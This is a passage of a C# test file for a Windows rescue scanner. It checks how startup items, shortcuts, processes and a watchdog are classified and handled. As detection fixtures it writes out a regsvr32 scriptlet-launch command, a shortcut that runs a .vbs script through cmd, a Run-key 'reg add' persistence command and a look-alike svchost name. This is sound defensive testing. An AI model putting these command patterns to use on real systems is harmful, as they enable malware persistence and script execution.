            Eq("C:\\x\\a.sct", Heur.PayloadPath("regsvr32 /s /i:C:\\x\\a.sct scrobj.dll"), "switch:path");
            string[] t = Heur.LnkTarget(MakeLnk("C:\\Windows\\System32\\cmd.exe", "/c start C:\\Users\\V\\a.vbs"));
            True(t != null, "lnk parsed");
            Eq("C:\\Windows\\System32\\cmd.exe", t[0], "lnk target"); Eq("/c start C:\\Users\\V\\a.vbs", t[1], "lnk arguments");
            True(Heur.LnkTarget(new byte[] { 1, 2, 3 }) == null && Heur.LnkTarget(Encoding.ASCII.GetBytes(new string('x', 200))) == null, "not a link");
            // (not below %TEMP%: a Temp path alone is SUSPECT)
            string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "rs startup " + Id);
            Directory.CreateDirectory(dir);
            try
            {
                string shown;
                string l1 = Path.Combine(dir, "evil.lnk"); File.WriteAllBytes(l1, MakeLnk("C:\\Windows\\System32\\cmd.exe", "/c start C:\\Users\\V\\a.vbs"));
                Eq("SUSPECT", MainForm.StartupRisk(l1, out shown), "lnk -> cmd + script in profile"); True(shown.Contains("a.vbs"), "target shown");
                string l2 = Path.Combine(dir, "app.lnk"); File.WriteAllBytes(l2, MakeLnk("C:\\Program Files\\Vendor\\tray.exe", ""));
                Eq("REVIEW", MainForm.StartupRisk(l2, out shown), "vendor shortcut REVIEW");
                string e1 = Path.Combine(dir, "svch0st.exe"); File.WriteAllText(e1, "MZ");
                Eq("SUSPECT", MainForm.StartupRisk(e1, out shown), "program dropped directly");
                string t1 = Path.Combine(dir, "notes.txt"); File.WriteAllText(t1, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y");
                Eq("SUSPECT", MainForm.StartupRisk(t1, out shown), "checker content");
                string t2 = Path.Combine(dir, "readme.url"); File.WriteAllText(t2, "[InternetShortcut]\r\nURL=https://example.com/");
                Eq("REVIEW", MainForm.StartupRisk(t2, out shown), "plain other file REVIEW");
            }
            finally { try { Directory.Delete(dir, true); } catch { } }
        }
        // ------------------------------------------------------------------ package C: processes / watchdog / launch
        // The 32-bit layout of PROCESSENTRY32W (th32DefaultHeapID is a 4-byte ULONG_PTR there), to check the x86 size
        // on a 64-bit test run.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct PROCESSENTRY32W_X86
        {
            public uint dwSize; public uint cntUsage; public uint th32ProcessID;
            public uint th32DefaultHeapID; public uint th32ModuleID; public uint cntThreads;
            public uint th32ParentProcessID; public int pcPriClassBase; public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        }

        static void ProcEntryLayout()
        {
            // sizeof(PROCESSENTRY32W): 568 (x64) / 556 (x86); the old ANSI struct was 304 / 296 and Process32FirstW failed
            Eq(IntPtr.Size == 8 ? 568 : 556, Native.EntrySize, "PROCESSENTRY32W size for this bitness");
            Eq(IntPtr.Size == 8 ? 44 : 36, (int)Marshal.OffsetOf(typeof(Native.PROCESSENTRY32W), "szExeFile"), "szExeFile offset");
            Eq(IntPtr.Size == 8 ? 32 : 24, (int)Marshal.OffsetOf(typeof(Native.PROCESSENTRY32W), "th32ParentProcessID"), "parent pid offset");
            Eq(556, Marshal.SizeOf(typeof(PROCESSENTRY32W_X86)), "x86 layout size");
            Eq(36, (int)Marshal.OffsetOf(typeof(PROCESSENTRY32W_X86), "szExeFile"), "x86 szExeFile offset");
        }

        static Func<int, DateTime?> Starts(Dictionary<int, int> minutes)
        {
            DateTime b = new DateTime(2026, 1, 1);
            return delegate(int pid) { int m; return minutes.TryGetValue(pid, out m) ? (DateTime?)b.AddMinutes(m) : null; };
        }

        static Dictionary<int, int> Map(params int[] pidParent)
        {
            Dictionary<int, int> d = new Dictionary<int, int>();
            for (int i = 0; i + 1 < pidParent.Length; i += 2) d[pidParent[i]] = pidParent[i + 1];
            return d;
        }

        static string Ids(List<int> l) { return string.Join(",", l.ConvertAll(delegate(int x) { return x.ToString(); }).ToArray()); }

        static Dictionary<int, DateTime> TreeRoot(int pid, Func<int, DateTime?> st)
        {
            Dictionary<int, DateTime> m = new Dictionary<int, DateTime>(); m[pid] = st(pid).Value; return m;
        }

        static void ProcTreeGrow()
        {
            HashSet<int> never = ProcTree.Never(500, 501);
            True(never.Contains(0) && never.Contains(4) && never.Contains(500) && never.Contains(501), "never: idle, System, self, watchdog");
            // cmd (100) -> miner (200) -> conhost (300); cmd -> timeout (210). Breadth first: parents before children.
            Dictionary<int, int> par = Map(100, 50, 200, 100, 210, 100, 300, 200, 0, 0, 4, 0);
            Dictionary<int, int> min = new Dictionary<int, int>(); min[50] = 0; min[100] = 10; min[200] = 11; min[210] = 12; min[300] = 13; min[0] = 0; min[4] = 0;
            Func<int, DateTime?> st = Starts(min);
            Dictionary<int, DateTime> m = TreeRoot(100, st);
            Eq("200,210,300", Ids(ProcTree.Grow(par, st, m, never)), "descendants in order");
            Eq(0, ProcTree.Grow(par, st, m, never).Count, "second walk adds nothing");
            // Idle 0 -> 0 and System 4 -> 0 never loop or join
            m = TreeRoot(0, st);
            Eq(0, ProcTree.Grow(par, st, m, never).Count, "pid 0 self-parent: no children, no loop");
            // a cycle created by PID reuse (1 -> 2 -> 1) terminates
            Dictionary<int, int> cyc = Map(1, 2, 2, 1);
            Dictionary<int, int> cm = new Dictionary<int, int>(); cm[1] = 10; cm[2] = 20;
            st = Starts(cm); m = TreeRoot(1, st);
            Eq("2", Ids(ProcTree.Grow(cyc, st, m, never)), "cycle terminates");
            // stale parent pid: winlogon (612, started at boot) has parent 548 = an exited smss; 548 is now malware
            Dictionary<int, int> stale = Map(612, 548, 548, 900, 700, 548);
            Dictionary<int, int> sm = new Dictionary<int, int>(); sm[612] = 1; sm[548] = 300; sm[700] = 301;
            st = Starts(sm); m = TreeRoot(548, st);
            Eq("700", Ids(ProcTree.Grow(stale, st, m, never)), "older process under a reused pid is not a child");
            // never: RescueScan (500) started by the tree root is skipped together with its own children (watchdog 501)
            Dictionary<int, int> self = Map(500, 100, 501, 500, 600, 100);
            Dictionary<int, int> selfm = new Dictionary<int, int>(); selfm[100] = 1; selfm[500] = 2; selfm[501] = 3; selfm[600] = 4;
            st = Starts(selfm); m = TreeRoot(100, st);
            Eq("600", Ids(ProcTree.Grow(self, st, m, never)), "self and watchdog never in the tree");
            // member 100 (started 10) was killed; its pid now belongs to a newer process (started 50)
            Dictionary<int, int> reuse = Map(100, 1, 101, 100, 102, 100);
            Dictionary<int, int> rm = new Dictionary<int, int>(); rm[100] = 50; rm[101] = 60; rm[102] = 30;
            st = Starts(rm);
            m = new Dictionary<int, DateTime>(); m[100] = new DateTime(2026, 1, 1).AddMinutes(10);
            Eq("102", Ids(ProcTree.Grow(reuse, st, m, never)), "child of the newer pid owner excluded, orphan of the old one kept");
            // a child whose start time cannot be read is not provably a child
            Dictionary<int, int> unk = Map(200, 100);
            Dictionary<int, int> um = new Dictionary<int, int>(); um[100] = 1;
            st = Starts(um); m = TreeRoot(100, st);
            Eq(0, ProcTree.Grow(unk, st, m, never).Count, "unknown start time: not added");
            // started in the same instant as the parent: still a child
            Dictionary<int, int> same = new Dictionary<int, int>(); same[100] = 5; same[200] = 5;
            st = Starts(same); m = TreeRoot(100, st);
            Eq("200", Ids(ProcTree.Grow(unk, st, m, never)), "same start time");
        }

        static void ProcCritical()
        {
            string sys = "C:\\Windows\\System32";
            True(ProcTree.IsCritical("csrss", "C:\\Windows\\System32\\csrss.exe", sys), "csrss in System32");
            True(ProcTree.IsCritical("LSASS.EXE", "c:\\windows\\system32\\lsass.exe", sys), "case-insensitive, .exe");
            True(ProcTree.IsCritical("winlogon", "(нет доступа)", sys), "unknown path counts as critical");
            True(ProcTree.IsCritical("wininit", "", sys), "empty path counts as critical");
            True(ProcTree.IsCritical("System", "", sys), "System");
            True(ProcTree.IsCritical("winpeshl", "X:\\Windows\\System32\\winpeshl.exe", "X:\\Windows\\System32"), "WinPE shell");
            True(!ProcTree.IsCritical("csrss", "C:\\Users\\u\\AppData\\Roaming\\csrss.exe", sys), "look-alike outside System32 is malware, not critical");
            True(!ProcTree.IsCritical("svchost", "C:\\Windows\\System32\\svchost.exe", sys), "svchost not in the list");
            True(!ProcTree.IsCritical("notepad", "C:\\Windows\\System32\\notepad.exe", sys), "notepad");
            True(!ProcTree.IsCritical("", "", sys), "empty name");
        }

        static void WatchdogArgsCases()
        {
            string e = Watchdog.NewEventName();
            True(Watchdog.ValidEventName(e) && Watchdog.ValidEventName(e + "_guard"), "fresh names valid");
            True(e != Watchdog.NewEventName(), "random per arming");
            True(!Watchdog.ValidEventName("RescueScanStopEvt") && !Watchdog.ValidEventName("Global\\" + e) && !Watchdog.ValidEventName(null), "fixed/foreign names rejected");
            string exe = "C:\\Tools dir\\RescueScan.exe";
            string[] a = ParseArgs(Watchdog.WatchdogArgs(1234, e, exe)).ToArray();
            int pid; string evt, x;
            True(Watchdog.ParseWatchdog(a, out pid, out evt, out x), "watchdog args round trip");
            Eq(1234, pid, "gui pid"); Eq(e, evt, "event"); Eq(exe, x, "exe with a space");
            True(!Watchdog.ParseWatchdog(new string[] { "--watchdog", "1234", "\"C:\\x.exe\"" }, out pid, out evt, out x), "old 3-arg form refused");
            True(!Watchdog.ParseWatchdog(new string[] { "--watchdog", "4", e, exe }, out pid, out evt, out x), "pid 4 refused");
            True(!Watchdog.ParseWatchdog(new string[] { "--watchdog", "1234", e, "rel.exe" }, out pid, out evt, out x), "relative exe refused");
            int wd; bool g;
            True(Watchdog.ParseRelaunched(ParseArgs(Watchdog.RelaunchArgs(77, e, true)).ToArray(), out wd, out evt, out g), "relaunch round trip");
            Eq(77, wd, "watchdog pid"); Eq(e, evt, "event"); True(g, "guard on");
            True(Watchdog.ParseRelaunched(new string[] { "--relaunched", "77", e, "0" }, out wd, out evt, out g) && !g, "guard off");
            True(!Watchdog.ParseRelaunched(new string[] { "--relaunched", "77", e + "_guard", "0" }, out wd, out evt, out g), "guard event is not a stop event");
            True(!Watchdog.ParseRelaunched(new string[] { "--relaunched", "x", e, "0" }, out wd, out evt, out g), "bad pid");
            True(!Watchdog.ParseRelaunched(new string[0], out wd, out evt, out g), "no args = normal start");
            Eq(0, Watchdog.BackoffMs(0), "no failure no wait"); Eq(500, Watchdog.BackoffMs(1), "first"); Eq(1000, Watchdog.BackoffMs(2), "second");
            Eq(30000, Watchdog.BackoffMs(7), "cap"); Eq(30000, Watchdog.BackoffMs(40), "cap, no overflow");
            DateTime now = DateTime.Now; List<DateTime> l = new List<DateTime>();
            for (int i = 0; i < 5; i++) l.Add(now.AddSeconds(-10 * i));
            True(!Watchdog.TooManyRelaunches(l, now), "5 relaunches in 2 min: still allowed");
            l.Add(now.AddSeconds(-1));
            True(Watchdog.TooManyRelaunches(l, now), "6th within 2 min: give up");
            List<DateTime> old = new List<DateTime>(); for (int i = 0; i < 10; i++) old.Add(now.AddMinutes(-5));
            True(!Watchdog.TooManyRelaunches(old, now), "old relaunches do not count");
        }

        static void LaunchModes()
        {
            Eq("exe", MainForm.LaunchMode("C:\\Windows\\System32\\cmd.exe"), "exe");
            Eq("exe", MainForm.LaunchMode("D:\\Tools\\X.COM"), "com");
            Eq("cmd", MainForm.LaunchMode("C:\\x\\fix.BAT"), "bat");
            Eq("cmd", MainForm.LaunchMode("C:\\x\\fix.cmd"), "cmd");
            foreach (string t in new string[] { "a.vbs", "a.js", "a.ps1", "a.hta", "a.lnk", "a.reg", "a.txt", "a.scr", "a.msi", "a", "a.exe.txt" })
                Eq("text", MainForm.LaunchMode("C:\\x\\" + t), t + " is never executed");
        }

        static void ProcSnapshotWin()
        {
            WindowsOnly();
            Dictionary<int, int> par = new Dictionary<int, int>(); Dictionary<int, string> names = new Dictionary<int, string>();
            int err;
            True(Native.Snapshot(par, names, out err), "snapshot ok (error " + err + ")");
            int me = Process.GetCurrentProcess().Id;
            True(par.ContainsKey(me), "own pid listed");
            True(names[me].EndsWith(".exe", StringComparison.OrdinalIgnoreCase), "Unicode image name: " + names[me]);
            True(par.Count > 5, "more than a handful of processes");
        }
    }
}
